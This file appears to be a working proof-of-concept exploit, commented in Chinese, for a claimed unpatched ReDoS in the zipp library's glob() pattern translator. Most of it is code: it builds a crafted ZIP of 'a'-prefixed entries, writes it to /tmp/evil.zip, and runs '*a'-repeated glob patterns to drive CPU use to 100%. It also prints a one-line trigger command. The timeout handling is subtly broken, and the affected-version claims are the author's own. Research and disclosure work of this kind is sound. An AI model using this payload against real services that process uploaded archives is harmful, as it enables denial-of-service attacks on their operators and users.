#!/usr/bin/env python3
"""
zipp ReDoS PoC — 全局可用

CVE-2024-5569 的补丁 (SanitizedNames) 只修复了 ZIP entry 导致的无限循环，
但 zipp.glob() → Translator.translate() 生成的 regex 有 O(N^K) 回溯。

影响版本：zipp 3.0.0 ~ 4.1.0（最新！）
修复状态：⚠️ 未修复 — 不是已知漏洞

攻击路径：
  1. 攻击者上传恶意 ZIP（含大量 a 前缀 entry）
  2. 服务端调用 zipp.Path(zip).glob(pattern)
  3. pattern 中 *a 重复 K 次 → regex [^/]*a 重复 K 次
  4. 长 a 串 + K≥5 → CPU 100%（正则回溯爆炸）

用法:
  python3 pocs/zipp_redos_poc.py [--zip-only] [--dest /tmp/evil.zip]
"""
import zipfile, io, time, sys, os, signal, warnings
warnings.filterwarnings("ignore")

def build_malicious_zip(num_entries: int = 100, max_a_len: int = 50) -> bytes:
    """构建触发 ReDoS 的 ZIP

    Args:
        num_entries: 包含 a 前缀的 entry 数量
        max_a_len: 最长 a 前缀长度

    原理:
        多条 entry 形如 aaaaa.../file.txt，长度从 1 到 max_a_len。
        regex `[^/]*a` 对每个 entry 都要回溯分割 a 串，
        导致 O(N^K) 复杂度。
    """
    data = io.BytesIO()
    with zipfile.ZipFile(data, 'w') as zf:
        for i in range(num_entries):
            zf.writestr(f"{'a' * (i % max_a_len + 1)}/file{i}.txt", "data")
        zf.writestr('a' * max_a_len, "data")
    return data.getvalue()

def build_dos_pattern(k: int = 6) -> str:
    """生成 *a 重复 K 次的 glob pattern"""
    return '*a' * k

def test_regex_complexity(k: int) -> tuple[str, str]:
    """显示生成的 regex 模式"""
    from zipp.glob import Translator
    tr = Translator()
    pattern = build_dos_pattern(k)
    regex = tr.translate(pattern)
    return pattern, regex

def run_poc(evil_zip: bytes, k: int = 6, timeout: int = 5) -> dict:
    """执行 ReDoS 测试"""
    zf = zipfile.ZipFile(io.BytesIO(evil_zip))
    from zipp import Path
    p = Path(zf)
    pattern = build_dos_pattern(k)

    start = time.time()
    timed_out = False
    try:
        signal.alarm(timeout)
        list(p.glob(pattern))
    except TimeoutError:
        timed_out = True
    except Exception:
        pass
    finally:
        signal.alarm(0)
    elapsed = time.time() - start

    return {
        "pattern": pattern,
        "k": k,
        "elapsed": elapsed,
        "timed_out": timed_out or elapsed >= timeout,
        "entries": len(zf.namelist()),
    }


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="zipp glob ReDoS PoC")
    parser.add_argument('--zip-only', action='store_true',
                        help='只生成 ZIP 文件，不运行测试')
    parser.add_argument('--dest', default='/tmp/evil.zip',
                        help='ZIP 输出路径')
    parser.add_argument('--entries', type=int, default=100,
                        help='ZIP 中 entry 数量')
    parser.add_argument('--max-a', type=int, default=50,
                        help='最长 a 前缀长度')
    args = parser.parse_args()

    # 1. 构建恶意 ZIP
    print("=" * 60)
    print("  zipp ReDoS PoC")
    print("=" * 60)
    print()
    print("[1/3] 构建恶意 ZIP...")
    zip_data = build_malicious_zip(args.entries, args.max_a)
    with open(args.dest, 'wb') as f:
        f.write(zip_data)
    print(f"  → {args.dest} ({len(zip_data)} bytes, {args.entries} entries)")
    print()

    if args.zip_only:
        print("ZIP 文件已生成。要测试使用时: ")
        print(f"  python3 -c \"from zipp import Path; list(Path('{args.dest}').glob('*a'*6))\"")
        sys.exit(0)

    # 2. 查看 regex 模式
    print("[2/3] 分析 regex 复杂度...")
    for k in range(1, 7):
        pat, regex = test_regex_complexity(k)
        print(f"  *a×{k:<3d} -> {regex[:70]}...")
    print()

    # 3. 执行测试
    print("[3/3] 执行 ReDoS 测试 (5s 超时)...")
    print()
    for k in range(1, 8):
        result = run_poc(zip_data, k=k, timeout=5)
        elapsed = result["elapsed"]
        if result["timed_out"]:
            print(f"  *a×{k}  ⚠️  CPU 100% >5s (超时终止)")
        else:
            print(f"  *a×{k}  ✅ {elapsed:.4f}s")
        sys.stdout.flush()

    print()
    print("=" * 60)
    print(f"  ZIP: {args.dest} ({len(zip_data)} bytes)")
    print(f"  影响: zipp 3.0.0 ~ 4.1.0 (最新版也受影响)")
    print(f"  修复: 无 — 不是已知 CVE，需协调披露")
    print("=" * 60)
